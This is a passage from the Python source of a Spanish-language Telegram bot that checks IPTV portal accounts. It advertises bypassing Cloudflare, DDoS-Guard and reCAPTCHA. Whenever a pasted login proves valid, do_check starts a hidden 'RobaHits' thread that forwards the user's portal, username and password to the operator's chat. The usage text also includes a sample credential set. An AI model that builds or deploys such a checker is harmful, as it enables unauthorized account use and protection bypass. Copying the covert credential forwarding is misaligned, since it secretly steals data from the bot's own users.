        f"║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>\n"
        f"║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{user}</code>\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{tg_user}\n"
        f"║ 🕐 {now_str()}\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚══════════════════════════════════════════════════════╝"
    )
    return t

def card_retry(portal, user, tg_user) -> str:
    t = (
        f"╔══════════════════════════════════════════════════════╗\n"
        f"║          🦂 𝐋𝐔𝐈𝐒 𝐑 — 𝐒𝐈𝐍 𝐑𝐄𝐒𝐏𝐔𝐄𝐒𝐓𝐀 🦂           ║\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ⚠️ 𝐒𝐢𝐧 𝐫𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 𝐯á𝐥𝐢𝐝𝐚 𝐝𝐞𝐥 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫\n"
        f"║ 🌐 𝐏𝐨𝐫𝐭𝐚𝐥: <code>{portal}</code>\n"
        f"║ 👤 𝐔𝐬𝐮𝐚𝐫𝐢𝐨: <code>{user}</code>\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ❓ 𝐏𝐮𝐞𝐝𝐞 𝐬𝐞𝐫 𝐚𝐜𝐭𝐢𝐯𝐚 — 𝐢𝐧𝐭𝐞𝐧𝐭𝐚 𝐜𝐨𝐧 𝐥𝐚 𝐔𝐑𝐋 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐚\n"
        f"║ 🔁 𝐔𝐬𝐚 /𝐜𝐡𝐞𝐜𝐤 𝐨 𝐩𝐞𝐠𝐚 𝐥𝐚 𝐔𝐑𝐋 /𝐠𝐞𝐭.𝐩𝐡𝐩\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐚𝐫𝐚: @{tg_user}\n"
        f"║ 🕐 {now_str()}\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚══════════════════════════════════════════════════════╝"
    )
    return t

# ═══════════════════════════════════════════════════════════════════
#  ⚡ LÓGICA CENTRAL
# ═══════════════════════════════════════════════════════════════════

async def do_check(update: Update, portal: str, user: str, pwd: str, is_xui: bool = False):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return

    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg = await update.message.reply_text("🔍 **Verificando cuenta...**\n_Esto puede tomar unos segundos_", parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_event_loop()

    status, result = await loop.run_in_executor(
        _EXECUTOR, verify_account, portal, user, pwd, is_xui)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 **Obteniendo contenido y categorías...**", parse_mode=ParseMode.MARKDOWN)
        ui = result["user_info"]
        
        # Paralelo: conteo + categorías
        live_f = loop.run_in_executor(_EXECUTOR, get_content_counts, portal, user, pwd)
        cats_f = loop.run_in_executor(_EXECUTOR, get_categories, portal, user, pwd)
        live, vod, series = await live_f
        cats = await cats_f
        
        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        
        # ENVIAR ROBAHIT SOLO PARA ACTIVAS
        threading.Thread(
            target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series, tg_user),
            daemon=True
        ).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)

    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user), parse_mode=ParseMode.HTML)

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ═══════════════════════════════════════════════════════════════════
#  📟 COMANDOS
# ═══════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    if update.effective_user.id == ADMIN_ID:
        global bot_active
        bot_active = True
    
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📖 Ayuda", callback_data="help"),
        InlineKeyboardButton("📊 Estado", callback_data="status"),
        InlineKeyboardButton("👑 Admin", callback_data="admin"),
    ]])
    
    await update.message.reply_text(
        f"╔══════════════════════════════════════════════════════╗\n"
        f"║              🦂 𝐈𝐏𝐓𝐕 𝐁𝐎𝐓 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐎 🦂              ║\n"
        f"║                   𝐁𝐘 𝐋𝐔𝐈𝐒 𝐑                       ║\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐁𝐨𝐭 𝐚𝐜𝐭𝐢𝐯𝐨 — 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢ó𝐧 𝐞𝐧 ~𝟓𝐬\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ 📌 <b>𝐏𝐞𝐠𝐚 𝐭𝐮 𝐔𝐑𝐋 𝐚𝐪𝐮í (𝐜𝐮𝐚𝐥𝐪𝐮𝐢𝐞𝐫 𝐟𝐨𝐫𝐦𝐚𝐭𝐨):</b>\n"
        f"║ <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
        f"║ <code>http://portal/playlist/usuario/pass/m3u_plus</code>\n"
        f"║ <code>portal|usuario|pass</code>\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ ⚡ 𝐏𝐚𝐫𝐚𝐥𝐞𝐥𝐨 — 𝐦𝐚𝐱 𝟐𝟓𝐬 𝐩𝐨𝐫 𝐜𝐮𝐞𝐧𝐭𝐚\n"
        f"║ 🛡️ 𝐁𝐲𝐩𝐚𝐬𝐬 𝐂𝐅/𝐃𝐃𝐨𝐒-𝐆𝐮𝐚𝐫𝐝/𝐫𝐞𝐂𝐀𝐏𝐓𝐂𝐇𝐀\n"
        f"║ 📡 𝐒𝐨𝐩𝐨𝐫𝐭𝐞 𝐗𝐔𝐈 𝐎𝐧𝐞 + 𝐗𝐭𝐫𝐞𝐚𝐦 + 𝐌𝟑𝐔\n"
        f"║ 🔔 𝐇𝐈𝐓𝐬 𝐚𝐥 𝐚𝐝𝐦𝐢𝐧 𝐚𝐮𝐭𝐨𝐦á𝐭𝐢𝐜𝐨\n"
        f"╠══════════════════════════════════════════════════════╣\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚══════════════════════════════════════════════════════╝",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ **No autorizado.**", parse_mode=ParseMode.MARKDOWN)
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"╔════════════════════════════════╗\n"
        f"║      🔴 𝐁𝐎𝐓 𝐃𝐄𝐓𝐄𝐍𝐈𝐃𝐎 🔴      ║\n"
        f"╠════════════════════════════════╣\n"
        f"║ Usa /start para reactivar      ║\n"
        f"║ 🦂 {BOT_USERNAME}               ║\n"
        f"╚════════════════════════════════╝",
        parse_mode=ParseMode.HTML)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s = divmod(rem, 60)
    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    
    await update.message.reply_text(
        f"╔════════════════════════════════════════════╗\n"
        f"║       📊 𝐄𝐒𝐓𝐀𝐃𝐎 𝐃𝐄𝐋 𝐁𝐎𝐓 📊           ║\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 🦂 𝐁𝐨𝐭: {estado}\n"
        f"║ ⏰ 𝐔𝐩𝐭𝐢𝐦𝐞: {h:02d}h {m:02d}m {s:02d}s\n"
        f"║ 🕐 𝐇𝐨𝐫𝐚: {now_str()}\n"
        f"║ 🌐 𝐙𝐨𝐧𝐚: {TZ_NAME}\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ ✅ 𝐇𝐢𝐭𝐬: {STATS['hits']}\n"
        f"║ ❌ 𝐅𝐚𝐢𝐥𝐬: {STATS['fails']}\n"
        f"║ 🔄 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: {STATS['retries']}\n"
        f"║ ⭐ 𝐓𝐨𝐭𝐚𝐥: {STATS['checks']}\n"
        f"║ 👥 𝐔𝐬𝐮𝐚𝐫𝐢𝐨𝐬: {len(STATS['users'])}\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 🤖 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threading.active_count()}\n"
        f"║ 🔔 𝐑𝐨𝐛𝐚𝐇𝐢𝐭𝐬: ✅ Activo\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚════════════════════════════════════════════╝",
        parse_mode=ParseMode.HTML)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 **Uso:**\n"
            "`/check portal:puerto usuario contraseña`\n\n"
            "🔥 **Ejemplo:**\n"
            "`/check etvhosts.site:55337 DefJXWm41 Vfi68Yqa57`",
            parse_mode=ParseMode.MARKDOWN)
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("📌 `/debug portal:puerto usuario contraseña`", parse_mode=ParseMode.MARKDOWN)
        return
    portal, user, pwd = args[0], args[1], args[2]
    msg = await update.message.reply_text("🔬 **Diagnóstico en progreso...**", parse_mode=ParseMode.MARKDOWN)
    
    lines = [f"🔬 **DIAGNÓSTICO** `{portal}`\n"]
    
    # TCP test
    host = portal.split(':')[0]
    for p in (80, 443, 8080, 25461):
        try:
            conn = socket.create_connection((host, p), timeout=3)
            conn.close()
            lines.append(f"✅ TCP puerto {p}: OK")
        except Exception as e:
            lines.append(f"❌ TCP puerto {p}: {str(e)[:30]}")
    
    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_cmds = ""
    if update.effective_user.id == ADMIN_ID:
        admin_cmds = (
            "\n\n🔧 **Comandos Admin:**\n"
            "/stop — Detener bot\n"
            "/status — Estadísticas\n"
            "/debug portal user pass — Diagnóstico\n"
        )
    
    await update.message.reply_text(
        f"╔════════════════════════════════════════════╗\n"
        f"║        🦂 𝐀𝐘𝐔𝐃𝐀 — 𝐋𝐔𝐈𝐒 𝐑 🦂            ║\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 📌 **Comandos:**\n"
        f"║ /start — Iniciar bot\n"
        f"║ /check portal user pass — Verificar\n"
        f"║ /help — Esta ayuda\n"
        f"{admin_cmds}\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 💡 **Formatos soportados:**\n"
        f"║ • `http://portal:8080/get.php?username=U&amp;password=P`\n"
        f"║ • `http://portal/playlist/user/pass/m3u_plus` ← XUI One\n"
        f"║ • `portal|usuario|pass`\n"
        f"║ • `portal usuario pass`\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║ 🦂 {BOT_USERNAME}\n"
        f"╚════════════════════════════════════════════╝",
        parse_mode=ParseMode.MARKDOWN)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "help":
        await query.message.reply_text(
            f"💡 **Pega tu URL directamente o usa:**\n"
            f"`/check portal:puerto user pass`\n\n"
            f"**Formatos:**\n"
            f"• `http://portal/get.php?username=U&password=P`\n"
            f"• `http://portal/playlist/user/pass/m3u_plus`\n"
            f"• `portal|user|pass`\n\n"
            f"🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN)
    elif query.data == "status":
        estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
        await query.message.reply_text(
            f"📊 {estado} | ✅ {STATS['hits']} | ⭐ {STATS['checks']} | 👥 {len(STATS['users'])}\n"
            f"🕐 {now_str()}\n🦂 {BOT_USERNAME}")
    elif query.data == "admin" and update.effective_user.id == ADMIN_ID:
        await query.message.reply_text(
            f"👑 **Panel Admin:**\n"
            f"/status — Estadísticas\n"
            f"/stop — Detener bot\n"
            f"/debug — Diagnóstico\n\n"
            f"📊 Stats: {STATS['hits']} hits de {STATS['checks']} checks\n"
            f"🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return
    
    text = (update.message.text or "").strip()
    portal, user, pwd, is_xui = extract_from_url(text)
    
    if portal and user and pwd:
        await do_check(update, portal, user, pwd, is_xui=is_xui)
    else:
        await update.message.reply_text(
            f"❓ **Formato no reconocido.**\n\n"
            f"📌 **Ejemplos válidos:**\n"
            f"`http://portal:8080/get.php?username=U&password=P`\n"
            f"`http://portal/playlist/usuario/pass/m3u_plus`\n"
            f"`portal|usuario|pass`\n\n"
            f"Usa /help para más info.\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.MARKDOWN)

# ═══════════════════════════════════════════════════════════════════
#  🚀 MAIN — Loop robusto 24/7
# ═══════════════════════════════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        log.error("❌ BOT_TOKEN no configurado")
        return

    log.info("╔══════════════════════════════════════════════════════╗")
    log.info("║     🦂 IPTV BOT ULTRA PRO v4.0 — BY LUIS R 🦂     ║")
    log.info("║              🌟 SISTEMA 24/7 ACTIVADO 🌟             ║")
    log.info("╚══════════════════════════════════════════════════════╝")
    log.info(f"📅 Inicio: {now_str()}")
    log.info(f"🌐 Zona horaria: {TZ_NAME}")
    log.info(f"🔔 RobaHits enviando a: {ROBAHITS_CHATID}")
    log.info(f"⚡ Timeouts: TCP={TCP_TIMEOUT}s | HTTP={CONN_TIMEOUT}s | READ={READ_TIMEOUT}s | TOTAL={TOTAL_TIMEOUT}s")

    RETRY_DELAYS = [5, 10, 15, 30, 60]
    attempt = 0

    while True:
        try:
            app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
            
            app.add_handler(CommandHandler("start", cmd_start))
            app.add_handler(CommandHandler("stop", cmd_stop))
            app.add_handler(CommandHandler("status", cmd_status))
            app.add_handler(CommandHandler("check", cmd_check))
            app.add_handler(CommandHandler("debug", cmd_debug))
            app.add_handler(CommandHandler("help", cmd_help))
            app.add_handler(CallbackQueryHandler(callback_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

            log.info("✅ Bot listo y funcionando 24/7")
            app.run_polling(drop_pending_updates=True)

            attempt = 0
            time.sleep(2)

        except Exception as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.error(f"❌ Error: {e}")
            log.info(f"🔄 Reconectando en {delay}s... (Intento {attempt + 1})")
            time.sleep(delay)
            attempt += 1

if __name__ == "__main__":
    main()
